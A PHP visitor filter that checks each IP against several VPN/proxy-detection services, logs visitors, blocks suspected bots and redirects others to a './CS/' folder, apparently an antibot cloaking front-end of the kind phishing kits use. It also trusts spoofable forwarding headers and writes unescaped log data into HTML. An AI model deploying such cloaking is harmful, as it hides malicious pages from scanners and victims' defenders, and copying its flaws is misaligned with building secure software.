<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

function getRealIpAddr() {
    $headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED', 
        'HTTP_X_CLUSTER_CLIENT_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_FORWARDED', 
        'REMOTE_ADDR'
    ];

    foreach ($headers as $header) {
        if (isset($_SERVER[$header]) && filter_var($_SERVER[$header], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            return $_SERVER[$header];
        }
    }

    return $_SERVER['REMOTE_ADDR'];
}

$ip = getRealIpAddr();
$cache_file = "cache/{$ip}.txt";
$log_file = 'logs.csv';
if (!file_exists($log_file)) {
  // Create the file and write the headers if it does not exist.
  $headers = "IP,ISP,Type,Country,Timestamp\n";

  file_put_contents($log_file, $headers);
}
class Bot {
    const api1 = "https://blackbox.ipinfo.app/lookup/";
    const api2 = "http://check.getipintel.net/check.php?ip=";
    const api3 = "https://ip.teoh.io/api/vpn/";
    const api4 = "http://proxycheck.io/v2/";
    const api5 = "https://v2.api.iphub.info/guest/ip/";
    const api6 = "https://ipleak.net/json";
    const block = "BLOCK";
    const allow = "ALLOW";
    private function __curl($url) {
      $ch = curl_init();
      
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Return the transfer as a string
      curl_setopt($ch, CURLOPT_HEADER, 0); // Don’t return header in output
      
      $output = curl_exec($ch);
      
      if (curl_errno($ch)) {
          // Handle error, you might want to log this error or handle it in a way appropriate to your needs
          return false;
      }
      
      curl_close($ch);
      return $output; // This contains the output string
    }
    private function __jsondecode($json) {
        return json_decode($json); // Corrected to json_decode
    }
    public function proxy1($ip) {
      $url = self::api1 . $ip;
      $response = $this->__curl($url);
      
      if($response === false) {
          // Handle error, you might want to log this error or allow traffic if the API is unreachable
          return self::allow;
      }
      
      return $response == "Y" ? self::block : self::allow;
    }
    public function proxy2($ip) {
        $url = self::api2 . $ip . "&contact=yourEmail" . rand(1999999, 19999999) . "@domain.com";
        $response = $this->__curl($url);
        
        if($response === false || !is_numeric($response)) {
            // Handle error, you might want to log this error or handle it in a way appropriate to your needs
            return self::allow;
        }
        
        return ((float)$response >= 0.99) ? self::block : self::allow;
    }
    
    public function proxy3($ip) {
        $url = self::api3 . $ip;
        $response = $this->__curl($url);
        
        if($response === false) {
            return self::allow;
        }
        
        $json = $this->__jsondecode($response);
        return (isset($json->risk) && $json->risk == "high") ? self::block : self::allow;
    }
    
    public function proxy4($ip) {
        $url = self::api4 . $ip . "&risk=1&vpn=1";
        $response = $this->__curl($url);
        
        if($response === false) {
            return self::allow;
        }
        
        $json = $this->__jsondecode($response);
        return (isset($json->status) && $json->status == "ok" && isset($json->$ip->proxy) && $json->$ip->proxy == "yes") ? self::block : self::allow;
    }
    
    public function proxy5($ip) {
      $url = self::api5 . $ip . "?c=" . md5(rand(0, 11));
      $response = $this->__curl($url);
      
      if($response === false) {
          return self::allow;
      }
      
      $json = $this->__jsondecode($response);
      return (isset($json->block) && $json->block == 1) ? self::block : self::allow;
  }
    public function checkcountry($ip) {
      $url = "http://ipinfo.io/{$ip}/json";
      $response = $this->__curl($url);
      $json = $this->__jsondecode($response);
      return $json;
  }
}
function isBot($bot, $ip) {
    // Corrected to pass $ip to the proxy methods
    if ($bot->proxy1($ip) == Bot::block) return true;
    if ($bot->proxy2($ip) == Bot::block) return true;
    if ($bot->proxy3($ip) == Bot::block) return true;
    if ($bot->proxy4($ip) == Bot::block) return true;
    if ($bot->proxy5($ip) == Bot::block) return true;
    return false;
}

if (!is_dir('cache')) {
  mkdir('cache');
}

if (file_exists($cache_file) && (time() - filemtime($cache_file)) < 3600) {
  $is_bad_ip = file_get_contents($cache_file) === '1';
} else {
  $bot = new Bot();
  $is_bad_ip = isBot($bot, $ip);
  $is_human = !$is_bad_ip ? 'human' : 'bot';

// Append a log entry
  $jsoni = $bot->checkcountry($ip);

  $isp = isset($jsoni->org) ? $jsoni->org : 'Unknown';
  $country = isset($jsoni->country) ? $jsoni->country : 'Unknown';

  // Append a log entry
  $timestamp = date("Y-m-d H:i:s");
  $log_entry = "$ip,$isp,$is_human,$country,$timestamp\n";
  file_put_contents($log_file, $log_entry, FILE_APPEND);
  file_put_contents($cache_file, $is_bad_ip ? '1' : '0');
}


$log_entries = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$human_count = 0;
$bot_count = 0;
$log_html = '';

foreach($log_entries as $entry) {
  list($ip, $isp, $type, $country, $timestamp) = explode(',', $entry);
  if(trim($type) == 'human') $human_count++;
  if(trim($type) == 'bot') $bot_count++;
  $log_html .= "<div class='log-entry'>
                  <span class='timestamp'>$timestamp</span>
                  <span class='ip'>$ip</span>
                  <span class='isp'>$isp</span>
                  <span class='type $type'>$type</span>
                  <span class='country'>$country</span>
                </div>";
}





// Generate logs.html content
$html_content = "<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <title>Logs</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        header {
            background: #50b3a2;
            color: white;
            text-align: center;
            padding: 1em 0;
        }
        .container {
            margin: auto;
            width: 70%;
            overflow: auto;
        }
        .count {
            font-weight: bold;
            margin-bottom: 20px;
            background: #e3e3e3;
            padding: 1em;
            text-align: center;
        }
        .log-entry {
          display: flex;
          justify-content: space-around; /* Updated from space-between to space-around for equal spacing */
          background: #ffffff;
          margin-bottom: 1px;
          padding: 0.5em 1em;
          border: 1px solid #ddd;
        }
        .human {
            color: green;
        }
        .bot {
            color: red;
        }
    </style>
</head>
<body>
    <header>
        <div>Total Visitors: " . ($human_count + $bot_count) . "</div>
    </header>
    <div class='container'>
        <div class='count'>Humans: $human_count</div>
        <div class='count'>Bots: $bot_count</div>
        $log_html
    </div>
</body>
</html>";



// Write the content to logs.html
file_put_contents('logs.html', $html_content);


if ($is_bad_ip) {
  echo "<!DOCTYPE html>
  <html lang='en'>
  <head>
      <meta charset='UTF-8'>
      <title>Access Denied</title>
      <style>
          body { 
              font-family: 'Arial', sans-serif; 
              background-color: #f4f4f4; 
              text-align: center;
              padding-top: 20%;
          }
          .message {
              background-color: #ffcccc;
              padding: 20px;
              display: inline-block;
              border: 1px solid red;
          }
      </style>
  </head>
  <body>
      <div class='message'>Access Denied: We don't accept people from your location . please try later or disable any vpn if you are using it !</div>
  </body>
  </html>";
  exit();
}
else
{
  header('Location: ./CS/');
}

?>